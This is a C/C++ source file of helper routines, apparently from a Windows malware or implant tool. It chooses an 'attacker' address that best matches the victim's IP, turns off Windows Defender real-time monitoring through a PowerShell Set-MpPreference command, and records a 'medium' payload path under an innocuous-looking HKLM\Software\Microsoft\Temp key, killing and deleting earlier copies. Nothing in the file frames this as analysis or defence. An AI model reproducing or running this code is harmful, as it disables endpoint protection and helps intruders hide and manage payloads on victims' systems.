#include "helpers.h"


DWORD CompareIpAddresses(char* LocalHost, const char* RemoteAddr) {
    DWORD Score = 0;
    DWORD LocalInd = 0;
    DWORD RemoteInd = 0;
    DWORD MaskValue = 0x80;
    DWORD CurrMask = 0x80;
    DWORD MatchingFields = 0;
    DWORD LocalNumeric = 0;
    DWORD RemoteNumeric = 0;

    while (MatchingFields != 4) {
        while (LocalHost[LocalInd] != '.' && LocalHost[LocalInd] != '\0') {
            LocalNumeric *= 10;
            LocalNumeric += (LocalHost[LocalInd] - 0x30);
            LocalInd++;
        }

        while (RemoteAddr[RemoteInd] != '.' && RemoteAddr[RemoteInd] != '\0') {
            RemoteNumeric *= 10;
            RemoteNumeric += (RemoteAddr[RemoteInd] - 0x30);
            RemoteInd++;
        }

        while (CurrMask != 0) {
            if ((RemoteNumeric & CurrMask) == (LocalNumeric & CurrMask)) {
                Score++;
            }
            else {
                return Score;
            }
            CurrMask /= 2;
        }
        RemoteInd++;
        LocalInd++;
        MatchingFields++;
        LocalNumeric = 0;
        RemoteNumeric = 0;
        CurrMask = MaskValue;
    }
    return Score;  // If got here - 32, probably not possible, exactly like current IP address
}


BOOL MatchIpAddresses(char* TargetAddress, char* AttackerAddress, const char* AttackerIps) {
    char LocalHostName[80];
    char* CurrIp = NULL;
    char CurrAttacker[MAXIPV4_ADDRESS_SIZE] = { 0 };

    struct hostent* LocalIpsList = NULL;
    DWORD CompareScore = 0;
    DWORD CurrentScore = 0;
    DWORD AddrIndex = 0;
    DWORD AttackIndex = 0;
    WSADATA SockData = { 0 };
    if (WSAStartup(MAKEWORD(2, 2), &SockData) != 0) {
        return FALSE;
    }


    // Get the hostname of the local machine to get ip addresses -
    if (gethostname(LocalHostName, sizeof(LocalHostName)) == SOCKET_ERROR) {
        printf("%d when getting local host name!", WSAGetLastError());
        WSACleanup();
        return FALSE;
    }
    LocalIpsList = gethostbyname(LocalHostName);
    if (LocalIpsList == 0) {
        WSACleanup();
        return FALSE;
    }


    // Find the address pair with the most similar bits in the address -
    while (AddrIndex < strlen(AttackerIps)) {
        while (AttackerIps[AddrIndex] != '~' && AttackerIps[AddrIndex] != '\0') {
            CurrAttacker[AttackIndex] = AttackerIps[AddrIndex];
            AddrIndex++;
            AttackIndex++;
        }
        CurrAttacker[AttackIndex] = '\0';
        AttackIndex = 0;
        if (AttackerIps[AddrIndex] == '~') {
            AddrIndex++;
        }

        for (int i = 0; LocalIpsList->h_addr_list[i] != 0; ++i) {
            struct in_addr addr;
            memcpy(&addr, LocalIpsList->h_addr_list[i], sizeof(struct in_addr));
            CurrIp = inet_ntoa(addr);
            CurrentScore = CompareIpAddresses(CurrIp, CurrAttacker);
            if (CurrentScore > CompareScore) {
                CompareScore = CurrentScore;
                RtlZeroMemory(TargetAddress, MAXIPV4_ADDRESS_SIZE);
                RtlZeroMemory(AttackerAddress, MAXIPV4_ADDRESS_SIZE);
                memcpy(TargetAddress, CurrIp, strlen(CurrIp) + 1);
                memcpy(AttackerAddress, CurrAttacker, strlen(CurrAttacker) + 1);
            }
        }
    }

    WSACleanup();
    return TRUE;
}


BOOL GetAddresses(char* Target, char* Attacker, const char* AttackAddresses) {
    if (!MatchIpAddresses(Target, Attacker, AttackAddresses)) {
        printf("[-] Cannot find the target address and the matching attacker address!\n");
        return FALSE;
    }
    printf("Target: %s, Attacker: %s\n", Target, Attacker);
    return TRUE;
}


DWORD SpecialQuit(DWORD LastError, const char* StatusName, HANDLE CloseArr[], DWORD CloseSize, LogFile* CurrLog) {
    CurrLog->WriteError(StatusName, LastError);
    for (int i = 0; i < (int)CloseSize; i++) {
        CloseHandle(CloseArr[i]);
    }
    CurrLog->CloseLog();
    return LastError;
}


RETURN_LAST RealTime(BOOL IsDisable, LogFile* LogToWrite) {
    RETURN_LAST LastError = { 0, ERROR_SUCCESS };
    const char* Disable = "powershell.exe -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"";
    const char* Enable = "powershell.exe -command \"Set-MpPreference -DisableRealtimeMonitoring $false\"";
    if (IsDisable) {
        LastError.LastError = system(Disable);
    }
    else {
        LastError.LastError = system(Enable);
    }

    if (LastError.LastError == -1) {
        LastError.LastError = GetLastError();
        LastError.Represent = ERROR_GENERIC_COMMAND_FAILED;
        if (IsDisable) {
            SpecialQuit(LastError.LastError, "[-] Failed to disable RealTime Protection - ", NULL, 0, LogToWrite);
        }
        else {
            SpecialQuit(LastError.LastError, "[-] Failed to enable RealTime Protection - ", NULL, 0, LogToWrite);
        }
        return LastError;
    }
    LastError.LastError = 0;
    if (IsDisable) {
        LogToWrite->WriteLog((PVOID)"[+] Disabled RealTime Protection!\n", 35);
    }
    else {
        LogToWrite->WriteLog((PVOID)"[+] Enabled RealTime Protection!\n", 34);
    }
    return LastError;
}


BOOL DeletePrevious(char* CurrentPath, LogFile* CurrLog) {
    HKEY RegistryHandle = HKEY_LOCAL_MACHINE;
    char LastPath[500] = { 0 };
    char KillLast[20] = { 0 };
    char LastName[MAX_PATH] = { 0 };
    DWORD LastType = REG_SZ;
    DWORD LastSize = 500;
    DWORD LastErr = 0;

    std::string RegistryKey("Software\\Microsoft\\Temp");
    LSTATUS Result = RegCreateKeyA(HKEY_LOCAL_MACHINE, RegistryKey.c_str(), &RegistryHandle);
    if (Result != ERROR_SUCCESS) {
        return FALSE;
    }


    // Get existing/nonexisting value of CurrMedium (last path) -
    Result = RegGetValueA(RegistryHandle, NULL, "CurrMedium", RRF_RT_REG_SZ, &LastType, LastPath, &LastSize);
    if (Result != ERROR_SUCCESS && Result != ERROR_FILE_NOT_FOUND) {
        RegDeleteKeyA(RegistryHandle, NULL);
        RegCloseKey(RegistryHandle);
        return FALSE;
    }

    if (Result != ERROR_FILE_NOT_FOUND) {
        // Get process name of medium and kill it -
        GetServiceName(LastPath, LastName);
        REPLACEMENT Rep = { LastName, '*', 1 };
        REPLACEMENT RepArr[1] = { Rep };
        LastErr = ExecuteSystem("taskkill /IM \"*\" /F", RepArr, 1);
        if (LastErr != 0) {
            RegDeleteKeyA(RegistryHandle, NULL);
            RegCloseKey(RegistryHandle);
            CurrLog->WriteError("[-] Could not terminate last medium - ", LastErr);
            return FALSE;
        }


        // delete the last medium file from temp -
        if (!DeleteFileA(LastPath)) {
            RegDeleteKeyA(RegistryHandle, NULL);
            RegCloseKey(RegistryHandle);
            LastErr = GetLastError();
            if (!(LastErr == ERROR_FILE_NOT_FOUND || LastErr == ERROR_PATH_NOT_FOUND || LastErr == ERROR_ACCESS_DENIED)) {
                CurrLog->WriteError("[-] Could not delete last medium file - ", GetLastError());
                return FALSE;
            }
        }
    }


    // Set value for new path of medium -
    Result = RegSetValueExA(RegistryHandle, "CurrMedium", 0, REG_SZ, (BYTE*)CurrentPath, (int)strlen(CurrentPath) + 1);
    while (Result != ERROR_SUCCESS) {
        RegDeleteKeyA(RegistryHandle, NULL);
        RegCloseKey(RegistryHandle);
        CurrLog->WriteError("[-] Could not set the value of CurrMedium to the current path - ", Result);
        Result = RegCreateKeyA(HKEY_LOCAL_MACHINE, RegistryKey.c_str(), &RegistryHandle);
        while (Result != ERROR_SUCCESS) {
            Result = RegCreateKeyA(HKEY_LOCAL_MACHINE, RegistryKey.c_str(), &RegistryHandle);
        }
        Result = RegSetValueExA(RegistryHandle, "CurrMedium", 0, REG_SZ, (BYTE*)CurrentPath, (int)strlen(CurrentPath) + 1);
    }
    /*
    if (Result != ERROR_SUCCESS) {
        RegDeleteKeyA(RegistryHandle, NULL);
        RegCloseKey(RegistryHandle);
        CurrLog->WriteError("[-] Could not set the value of CurrMedium to the current path - ", Result);
        return FALSE;
    }
    */
    RegCloseKey(RegistryHandle);
    CurrLog->WriteLog((PVOID)"[+] Success in deleting last medium, stopping its execution and cleaning!\n", 75);
    return TRUE;
}